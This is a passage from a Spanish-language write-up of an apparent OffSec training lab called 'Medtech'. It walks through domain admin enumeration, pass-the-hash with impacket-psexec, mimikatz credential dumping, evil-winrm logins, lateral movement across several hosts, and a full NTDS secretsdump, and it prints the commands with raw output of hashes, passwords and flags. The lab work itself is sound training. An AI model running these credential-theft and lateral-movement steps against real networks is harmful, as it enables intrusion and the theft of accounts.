krbtgt        9/27/2022 10:47:41 AM  12/31/1600 4:00:00 PM
leon          11/17/2022 12:36:23 PM 6/2/2025 5:54:46 AM
joe           11/11/2022 2:02:39 AM  6/2/2025 4:38:23 AM
peach         9/28/2022 3:51:13 AM   12/31/1600 4:00:00 PM
mario         9/28/2022 3:50:46 AM   12/31/1600 4:00:00 PM
wario         11/15/2022 1:43:27 AM  11/15/2022 1:43:35 AM
yoshi         11/15/2022 5:25:26 AM  6/2/2025 4:42:06 AM

PS C:\Users\leon> Get-NetGroup "Domain Admins" | select member

member
------
{CN=leon,CN=Users,DC=medtech,DC=com, CN=Administrator,CN=Users,DC=medtech,DC=com}

PS C:\Users\leon> net user leon /domain
The request will be processed at a domain controller for domain medtech.com.

User name                    leon
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/17/2022 1:36:23 PM
Password expires             Never
Password changeable          11/18/2022 1:36:23 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/2/2025 6:22:19 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.

PS C:\Users\leon> net group "Domain Admins" /domain
The request will be processed at a domain controller for domain medtech.com.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            leon
The command completed successfully.
```

> Parece que el usuario leon pertenece al gurpo **"Domain Admins"** del controlador de dominio. **Este es el host con mas prioridad de explotacion**

Teniendo el hash NTLM del usuario leon y sabiendo sus privilegios se abre el vector **Pass The Hash** para ingresar en cualquier host del dominio.

Ejecutamos este ataque directamente con Impacket:
`impacket-psexec -hashes:<NTLM Domain Admin user hash> <dominio>/<user>@<ip>`

En este caso en particular seri optimo encontrar el hash NTLM del usuario administrador de **DC01**

- **DC01** Obtenemos el hash NTLM Administrator, los flags y credenciales
```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# evil-winrm -i 172.16.xxx.10 -u 'leon' -p 'rabbit:)' -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\leon\Documents> hostname
DC01
*Evil-WinRM* PS C:\Users\leon\Documents> 
```
- Obtenemos Flags DC01

```powershell
*Evil-WinRM* PS C:\Users\leon\Documents> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/29/2022   2:41 PM             30 credentials.txt
-a----          6/2/2025   7:37 AM             34 proof.txt

*Evil-WinRM* PS C:\Users\leon\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
4eb44512883c4720f2f2cb16fe8d2744
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type credentials.txt
web01: offsec/century62hisan51
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

- **hash NTLM** administrator para pass the hash

```
*Evil-WinRM* PS C:\Users\leon\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DC01$
Domain            : MEDTECH
Logon Server      : (null)
Logon Time        : 7/24/2024 1:22:40 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DC01$
         * Domain   : MEDTECH
         * NTLM     : f9b92bf7e2f522b41d407cb930ac009a
         * SHA1     : df16571e0191c26d4ccfe69fd82ba42e863ad9cd
        tspkg :
        wdigest :
         * Username : DC01$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : dc01$
         * Domain   : MEDTECH.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 42464 (00000000:0000a5e0)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/24/2024 1:22:40 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : DC01$
         * Domain   : MEDTECH
         * NTLM     : 58c8817676a79e60b40d7dd01f0e26bb
         * SHA1     : bf5829fb424da78d4cb7ad2c6eac87962c355345
        tspkg :
        wdigest :
         * Username : DC01$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DC01$
         * Domain   : medtech.com
         * Password : 6c 68 cc 98 0c b6 68 a5 f5 54 f9 26 5e 13 85 b0 47 8d 7f 2b 1c da 12 b2 fc a8 2f 9b 00 c3 54 90 69 00 1d f1 47 78 ac f9 d2 60 e5 e1 05 ed e5 ad 69 d0 00 d5 70 09 f2 33 5b fd 48 a6 22 14 33 2b 2f 65 ab 3a 5a 78 ff 21 12 b2 b2 61 cc 4b cf ff 72 ed 69 71 9c 68 43 84 18 03 ad 00 a2 8d 5e 01 59 8d bf 82 17 dd 88 21 1e b4 04 1f 5d 55 89 c1 fd cc 90 62 29 49 90 36 51 24 e0 ae b0 0c 57 60 a1 db 4c bf aa 7f 4a 94 a1 41 b5 b0 d2 92 39 e7 22 cc 6f 44 88 e0 6f fd 5f 44 ee c4 7f f4 ce 27 94 26 c2 0a 79 28 92 df a0 09 28 8b 37 dc a8 c8 3b ed f5 2a 2b 4a df b3 e0 be 9d 14 62 6a 62 c3 39 53 99 a1 ed f8 79 7f d9 23 fb 60 01 2c 67 d1 03 01 c1 d6 6d 1a cb ba 6d 05 20 59 19 34 6a d7 5f ee 20 7b eb 40 d6 f1 65 f3 a2 d7 4e 20 76 2b
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 42408 (00000000:0000a5a8)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/24/2024 1:22:40 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : DC01$
         * Domain   : MEDTECH
         * NTLM     : f9b92bf7e2f522b41d407cb930ac009a
         * SHA1     : df16571e0191c26d4ccfe69fd82ba42e863ad9cd
        tspkg :
        wdigest :
         * Username : DC01$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DC01$
         * Domain   : medtech.com
         * Password : a8 6d d4 f3 d3 07 2d 09 f7 22 b6 58 0b be 4c 02 d6 b9 fd 59 9c 4d 19 da c9 6d 9d 3d 6d eb 2b 56 b0 0a 96 d5 9e 50 c5 b0 de 48 ee 50 ec 7a 0d 24 23 24 31 18 50 50 62 1e a4 b3 17 c0 aa c9 6d 2e 0e 93 53 33 38 a8 86 7b 91 59 96 55 6c b0 18 be b8 4c dd 5d 28 cc 40 af f7 01 6c da 84 4a dd 59 68 a3 fa 77 a4 5f db b4 1d 3f 0d bb 81 06 d7 68 22 28 ba 49 81 cc 3b e9 f9 f5 f2 7d ee de 44 86 a6 60 e7 1d d9 99 bd 90 d5 e2 93 bf a5 69 b7 fc 9a 31 5b 55 33 36 d4 22 2a 59 9a b8 97 7d d7 20 0d 72 ba b1 f1 07 27 c1 a1 c5 0b 6a 8a dc 03 b2 86 a9 90 d7 d9 03 c5 12 06 2e b5 43 a8 74 8e 8a 0d a4 fb a6 cc e6 f2 af c9 0e 5a 99 48 df 64 06 6c bf ee ea 0f 35 a4 fe e8 f5 74 04 b5 3f cb 7b 58 83 9b 64 ae d7 51 e8 01 5a 7e a5 82 c8 ed 53
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 521793 (00000000:0007f641)
Session           : Batch from 0
User Name         : Administrator
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 7/24/2024 1:25:04 AM
SID               : S-1-5-21-976142013-3766213998-138799841-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : MEDTECH
         * NTLM     : c33b5cf9fa1b1bb4894d4a6cd7c54034
         * SHA1     : 7fb7231f8b2114b9833510db6374dff1ca3a8447
         * DPAPI    : e265d0df1d02333a9299868edb42cf77
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : medtech.com
         * Password : denZV00Zwtpax57.
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 518962 (00000000:0007eb32)
Session           : Batch from 0
User Name         : Administrator
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 7/24/2024 1:25:02 AM
SID               : S-1-5-21-976142013-3766213998-138799841-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : MEDTECH
         * NTLM     : c33b5cf9fa1b1bb4894d4a6cd7c54034
         * SHA1     : 7fb7231f8b2114b9833510db6374dff1ca3a8447
         * DPAPI    : e265d0df1d02333a9299868edb42cf77
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : medtech.com
         * Password : denZV00Zwtpax57.
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/24/2024 1:22:41 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 71144 (00000000:000115e8)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/24/2024 1:22:40 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DC01$
         * Domain   : MEDTECH
         * NTLM     : 58c8817676a79e60b40d7dd01f0e26bb
         * SHA1     : bf5829fb424da78d4cb7ad2c6eac87962c355345
        tspkg :
        wdigest :
         * Username : DC01$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DC01$
         * Domain   : medtech.com
         * Password : 6c 68 cc 98 0c b6 68 a5 f5 54 f9 26 5e 13 85 b0 47 8d 7f 2b 1c da 12 b2 fc a8 2f 9b 00 c3 54 90 69 00 1d f1 47 78 ac f9 d2 60 e5 e1 05 ed e5 ad 69 d0 00 d5 70 09 f2 33 5b fd 48 a6 22 14 33 2b 2f 65 ab 3a 5a 78 ff 21 12 b2 b2 61 cc 4b cf ff 72 ed 69 71 9c 68 43 84 18 03 ad 00 a2 8d 5e 01 59 8d bf 82 17 dd 88 21 1e b4 04 1f 5d 55 89 c1 fd cc 90 62 29 49 90 36 51 24 e0 ae b0 0c 57 60 a1 db 4c bf aa 7f 4a 94 a1 41 b5 b0 d2 92 39 e7 22 cc 6f 44 88 e0 6f fd 5f 44 ee c4 7f f4 ce 27 94 26 c2 0a 79 28 92 df a0 09 28 8b 37 dc a8 c8 3b ed f5 2a 2b 4a df b3 e0 be 9d 14 62 6a 62 c3 39 53 99 a1 ed f8 79 7f d9 23 fb 60 01 2c 67 d1 03 01 c1 d6 6d 1a cb ba 6d 05 20 59 19 34 6a d7 5f ee 20 7b eb 40 d6 f1 65 f3 a2 d7 4e 20 76 2b
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 71126 (00000000:000115d6)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/24/2024 1:22:40 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DC01$
         * Domain   : MEDTECH
         * NTLM     : f9b92bf7e2f522b41d407cb930ac009a
         * SHA1     : df16571e0191c26d4ccfe69fd82ba42e863ad9cd
        tspkg :
        wdigest :
         * Username : DC01$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DC01$
         * Domain   : medtech.com
         * Password : a8 6d d4 f3 d3 07 2d 09 f7 22 b6 58 0b be 4c 02 d6 b9 fd 59 9c 4d 19 da c9 6d 9d 3d 6d eb 2b 56 b0 0a 96 d5 9e 50 c5 b0 de 48 ee 50 ec 7a 0d 24 23 24 31 18 50 50 62 1e a4 b3 17 c0 aa c9 6d 2e 0e 93 53 33 38 a8 86 7b 91 59 96 55 6c b0 18 be b8 4c dd 5d 28 cc 40 af f7 01 6c da 84 4a dd 59 68 a3 fa 77 a4 5f db b4 1d 3f 0d bb 81 06 d7 68 22 28 ba 49 81 cc 3b e9 f9 f5 f2 7d ee de 44 86 a6 60 e7 1d d9 99 bd 90 d5 e2 93 bf a5 69 b7 fc 9a 31 5b 55 33 36 d4 22 2a 59 9a b8 97 7d d7 20 0d 72 ba b1 f1 07 27 c1 a1 c5 0b 6a 8a dc 03 b2 86 a9 90 d7 d9 03 c5 12 06 2e b5 43 a8 74 8e 8a 0d a4 fb a6 cc e6 f2 af c9 0e 5a 99 48 df 64 06 6c bf ee ea 0f 35 a4 fe e8 f5 74 04 b5 3f cb 7b 58 83 9b 64 ae d7 51 e8 01 5a 7e a5 82 c8 ed 53
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 42463 (00000000:0000a5df)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/24/2024 1:22:40 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : DC01$
         * Domain   : MEDTECH
         * NTLM     : 58c8817676a79e60b40d7dd01f0e26bb
         * SHA1     : bf5829fb424da78d4cb7ad2c6eac87962c355345
        tspkg :
        wdigest :
         * Username : DC01$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DC01$
         * Domain   : medtech.com
         * Password : 6c 68 cc 98 0c b6 68 a5 f5 54 f9 26 5e 13 85 b0 47 8d 7f 2b 1c da 12 b2 fc a8 2f 9b 00 c3 54 90 69 00 1d f1 47 78 ac f9 d2 60 e5 e1 05 ed e5 ad 69 d0 00 d5 70 09 f2 33 5b fd 48 a6 22 14 33 2b 2f 65 ab 3a 5a 78 ff 21 12 b2 b2 61 cc 4b cf ff 72 ed 69 71 9c 68 43 84 18 03 ad 00 a2 8d 5e 01 59 8d bf 82 17 dd 88 21 1e b4 04 1f 5d 55 89 c1 fd cc 90 62 29 49 90 36 51 24 e0 ae b0 0c 57 60 a1 db 4c bf aa 7f 4a 94 a1 41 b5 b0 d2 92 39 e7 22 cc 6f 44 88 e0 6f fd 5f 44 ee c4 7f f4 ce 27 94 26 c2 0a 79 28 92 df a0 09 28 8b 37 dc a8 c8 3b ed f5 2a 2b 4a df b3 e0 be 9d 14 62 6a 62 c3 39 53 99 a1 ed f8 79 7f d9 23 fb 60 01 2c 67 d1 03 01 c1 d6 6d 1a cb ba 6d 05 20 59 19 34 6a d7 5f ee 20 7b eb 40 d6 f1 65 f3 a2 d7 4e 20 76 2b
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 42399 (00000000:0000a59f)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/24/2024 1:22:40 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : DC01$
         * Domain   : MEDTECH
         * NTLM     : f9b92bf7e2f522b41d407cb930ac009a
         * SHA1     : df16571e0191c26d4ccfe69fd82ba42e863ad9cd
        tspkg :
        wdigest :
         * Username : DC01$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DC01$
         * Domain   : medtech.com
         * Password : a8 6d d4 f3 d3 07 2d 09 f7 22 b6 58 0b be 4c 02 d6 b9 fd 59 9c 4d 19 da c9 6d 9d 3d 6d eb 2b 56 b0 0a 96 d5 9e 50 c5 b0 de 48 ee 50 ec 7a 0d 24 23 24 31 18 50 50 62 1e a4 b3 17 c0 aa c9 6d 2e 0e 93 53 33 38 a8 86 7b 91 59 96 55 6c b0 18 be b8 4c dd 5d 28 cc 40 af f7 01 6c da 84 4a dd 59 68 a3 fa 77 a4 5f db b4 1d 3f 0d bb 81 06 d7 68 22 28 ba 49 81 cc 3b e9 f9 f5 f2 7d ee de 44 86 a6 60 e7 1d d9 99 bd 90 d5 e2 93 bf a5 69 b7 fc 9a 31 5b 55 33 36 d4 22 2a 59 9a b8 97 7d d7 20 0d 72 ba b1 f1 07 27 c1 a1 c5 0b 6a 8a dc 03 b2 86 a9 90 d7 d9 03 c5 12 06 2e b5 43 a8 74 8e 8a 0d a4 fb a6 cc e6 f2 af c9 0e 5a 99 48 df 64 06 6c bf ee ea 0f 35 a4 fe e8 f5 74 04 b5 3f cb 7b 58 83 9b 64 ae d7 51 e8 01 5a 7e a5 82 c8 ed 53
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 39363 (00000000:000099c3)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 7/24/2024 1:22:37 AM
SID               :
        msv :
         [00000003] Primary
         * Username : DC01$
         * Domain   : MEDTECH
         * NTLM     : f9b92bf7e2f522b41d407cb930ac009a
         * SHA1     : df16571e0191c26d4ccfe69fd82ba42e863ad9cd
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DC01$
Domain            : MEDTECH
Logon Server      : (null)
Logon Time        : 7/24/2024 1:22:37 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DC01$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : dc01$
         * Domain   : MEDTECH.COM
         * Password : a8 6d d4 f3 d3 07 2d 09 f7 22 b6 58 0b be 4c 02 d6 b9 fd 59 9c 4d 19 da c9 6d 9d 3d 6d eb 2b 56 b0 0a 96 d5 9e 50 c5 b0 de 48 ee 50 ec 7a 0d 24 23 24 31 18 50 50 62 1e a4 b3 17 c0 aa c9 6d 2e 0e 93 53 33 38 a8 86 7b 91 59 96 55 6c b0 18 be b8 4c dd 5d 28 cc 40 af f7 01 6c da 84 4a dd 59 68 a3 fa 77 a4 5f db b4 1d 3f 0d bb 81 06 d7 68 22 28 ba 49 81 cc 3b e9 f9 f5 f2 7d ee de 44 86 a6 60 e7 1d d9 99 bd 90 d5 e2 93 bf a5 69 b7 fc 9a 31 5b 55 33 36 d4 22 2a 59 9a b8 97 7d d7 20 0d 72 ba b1 f1 07 27 c1 a1 c5 0b 6a 8a dc 03 b2 86 a9 90 d7 d9 03 c5 12 06 2e b5 43 a8 74 8e 8a 0d a4 fb a6 cc e6 f2 af c9 0e 5a 99 48 df 64 06 6c bf ee ea 0f 35 a4 fe e8 f5 74 04 b5 3f cb 7b 58 83 9b 64 ae d7 51 e8 01 5a 7e a5 82 c8 ed 53
        ssp :
        credman :
        cloudap :

mimikatz(commandline) # exit
Bye!
```
|user | hashNTLM | password |hostname |
|-----|----------|----------|---------|
|Administrator| c33b5cf9fa1b1bb4894d4a6cd7c54034 | denZV00Zwtpax57. | DC01 |

- Obtenemos el flag de **WEB01**:
```
offsec@WEB01:/$ sudo -l
Matching Defaults entries for offsec on WEB01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User offsec may run the following commands on WEB01:
    (ALL) NOPASSWD: ALL
    (ALL : ALL) NOPASSWD: ALL
offsec@WEB01:/$ sudo su
root@WEB01:/# cd root
root@WEB01:~# ls
gems  proof.txt  _site  startup.py
root@WEB01:~# cat proof.txt
664f2b67273c947856978e09d353ff73
root@WEB01:~# 
```

- Comenzamos a ir a los host restantes del dominio
#### CLIENT01

```powershell
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# impacket-psexec -hashes :c33b5cf9fa1b1bb4894d4a6cd7c54034 medtech.com/Administrator@172.16.116.82
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 172.16.116.82.....
[*] Found writable share ADMIN$
[*] Uploading file EyFLusph.exe
[*] Opening SVCManager on 172.16.116.82.....
[*] Creating service SAEk on 172.16.116.82.....
[*] Starting service SAEk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.22000.978]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
CLIENT01

C:\Windows\system32>powershell

PS C:\Windows\system32> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue                                                                                                  
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
    Directory: C:\Users\Administrator\Desktop                                                                                                                                                                     
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Mode                 LastWriteTime         Length Name                                                                                                                                                            
----                 -------------         ------ ----                                                                                                                                                            
-a----          6/2/2025   4:37 AM             34 proof.txt                                                                                                                                                       


    Directory: C:\Users\Administrator.MEDTECH\Searches


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         10/5/2022   8:16 AM             14 hole.txt 
```
#### CLIENT02

```powershell
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# impacket-psexec -hashes :c33b5cf9fa1b1bb4894d4a6cd7c54034 medtech.com/Administrator@172.16.116.83
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 172.16.116.83.....
[*] Found writable share ADMIN$
[*] Uploading file brkdSkeG.exe
[*] Opening SVCManager on 172.16.116.83.....
[*] Creating service ApPZ on 172.16.116.83.....
[*] Starting service ApPZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.22000.978]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users
 
C:\Users> powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
PS C:\Users> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/2/2025   4:37 AM             34 proof.txt                                                            


    Directory: C:\Users\wario\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/2/2025   4:37 AM             34 local.txt
```

#### PROD01

```powershell
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# impacket-psexec -hashes :c33b5cf9fa1b1bb4894d4a6cd7c54034 medtech.com/Administrator@172.16.116.13
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 172.16.116.13.....
[*] Found writable share ADMIN$
[*] Uploading file eMRDQfxh.exe
[*] Opening SVCManager on 172.16.116.13.....
[*] Creating service GAhK on 172.16.116.13.....
[*] Starting service GAhK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
'Get-ChildItem' is not recognized as an internal or external command,
operable program or batch file.
 
C:\Windows\system32> powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

whoami
PS C:\Windows\system32> whoami
nt authority\system

PS C:\Windows\system32> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue                                                                                                  
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/2/2025   4:37 AM             34 proof.txt 
```

#### Por ultimo podemos hacer un dump de secrets del dominio con las credenciales obtenidas del usuario administrador del Controlador de Dominio.

```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# impacket-secretsdump 'medtech.com/Administrator@172.16.116.10' -just-dc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password: denZV00Zwtpax57.
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c33b5cf9fa1b1bb4894d4a6cd7c54034:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7e68841e296897d2343488c23265e8b8:::
offsec:1000:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
leon:1105:aad3b435b51404eeaad3b435b51404ee:2e208ad146efda5bc44869025e06544a:::
joe:1106:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
peach:1107:aad3b435b51404eeaad3b435b51404ee:4e340266b912685014b98560d274d260:::
mario:1108:aad3b435b51404eeaad3b435b51404ee:8909f22bda647d382e7b448bea350175:::
wario:1109:aad3b435b51404eeaad3b435b51404ee:fdf36048c1cf88f5630381c5e38feb8e:::
yoshi:1110:aad3b435b51404eeaad3b435b51404ee:fdf36048c1cf88f5630381c5e38feb8e:::
DC01$:1001:aad3b435b51404eeaad3b435b51404ee:f9b92bf7e2f522b41d407cb930ac009a:::
FILES02$:1104:aad3b435b51404eeaad3b435b51404ee:ed09fad1f6c397ed85def981bbdcb1ef:::
DEV04$:1111:aad3b435b51404eeaad3b435b51404ee:f104e2b90d4a9ede3a8cf4db5472a54d:::
CLIENT01$:1112:aad3b435b51404eeaad3b435b51404ee:afc19caa51827c393439b6e467553203:::
PROD01$:1113:aad3b435b51404eeaad3b435b51404ee:42949794a90a5aa0bdd835638e3464b1:::
CLIENT02$:1114:aad3b435b51404eeaad3b435b51404ee:94be3b7d8695271fb962d253e6b4ab66:::
WEB02$:1115:aad3b435b51404eeaad3b435b51404ee:b735d40477f09c315a810f20bcf01e46:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:d5b3aa07384a07c1cddc7d294da45aaa79f609362fe213e3b9c6ce2ba3177c17
Administrator:aes128-cts-hmac-sha1-96:bbae44a37680b2bc55ffd22416f69473
Administrator:des-cbc-md5:e662d5e69858a464
krbtgt:aes256-cts-hmac-sha1-96:2fbdf667f0e699f054dc371cf680d16a8165e423ccb3855c3de1ec55b265eee8
krbtgt:aes128-cts-hmac-sha1-96:60439380b13c455e420b28fbb7185585
krbtgt:des-cbc-md5:8925ab9232f8a440
offsec:aes256-cts-hmac-sha1-96:5b2576be7351fea9dad9e21b48dc5d5f17ef393a321b7dfe4375244388f28771
offsec:aes128-cts-hmac-sha1-96:511d2aae500affc8cb6d92381fbc3255
offsec:des-cbc-md5:b389cdcd6e75cda2
leon:aes256-cts-hmac-sha1-96:18bc7b2902f8e94f682308de83871782042cd2911fa5511a7ca060ff1fc529da
leon:aes128-cts-hmac-sha1-96:77f060b17104ddaf899ac81011b41bfb
leon:des-cbc-md5:2679a7c49d58cdbc
joe:aes256-cts-hmac-sha1-96:1db69f3f5b0c94154867d6e489d4c645dac0e883ca29a632e1cfce22b7f772ed
joe:aes128-cts-hmac-sha1-96:e5fe7ddb352379ad769a64d54bd4744c
joe:des-cbc-md5:13f440a4fb088a1a
peach:aes256-cts-hmac-sha1-96:40bdb555c46ae25bffb317f4749d368be547f0566ac969b6ac8f29c73a8fdaab
peach:aes128-cts-hmac-sha1-96:0fd98708dafcc498cdecdf039f5a37fe
peach:des-cbc-md5:c7b37a58bf0d0dda
mario:aes256-cts-hmac-sha1-96:bc70923baae639735a0c645a3ae72d083d87e959739f6fa798ee54deeea590e1
mario:aes128-cts-hmac-sha1-96:1687c13f4072dfd9908b88563cb4d5d6
mario:des-cbc-md5:04dacebad3adb0ea
wario:aes256-cts-hmac-sha1-96:45ff513aeaa82ffc6610968f771f8135e84ebb5a78b8d222d117db06c3c8f881
wario:aes128-cts-hmac-sha1-96:7a18ed8d711570f996a1137b3b94b3d9
wario:des-cbc-md5:341675b319267608
yoshi:aes256-cts-hmac-sha1-96:e1811343872e30353e1f36965f2180992a6b6b6e97dd821b054e93771f7efbb3
yoshi:aes128-cts-hmac-sha1-96:a6c8f6f27f12ad15f0e77e9e380e2f76
yoshi:des-cbc-md5:752637fe163ebcd0
DC01$:aes256-cts-hmac-sha1-96:4aee8d042ec7129c61208b7d2f48cc11c1013dcea3cbdf647638b66180a1a408
DC01$:aes128-cts-hmac-sha1-96:1f20052623b43fbd2694bdab4e2aa53e
DC01$:des-cbc-md5:5e4c7ce3b9df01bf
FILES02$:aes256-cts-hmac-sha1-96:c7f19f6720319f93a3bea7691aedaf8d75165093e4296e1da0edb26c903468c9
FILES02$:aes128-cts-hmac-sha1-96:2325d7b672719fd90e558966b1fa9e9d
FILES02$:des-cbc-md5:cb54c757b61f08cb
DEV04$:aes256-cts-hmac-sha1-96:2eddc601429c3ddf49b473925f232bb03dd357511ddbaf3da797369974affc15
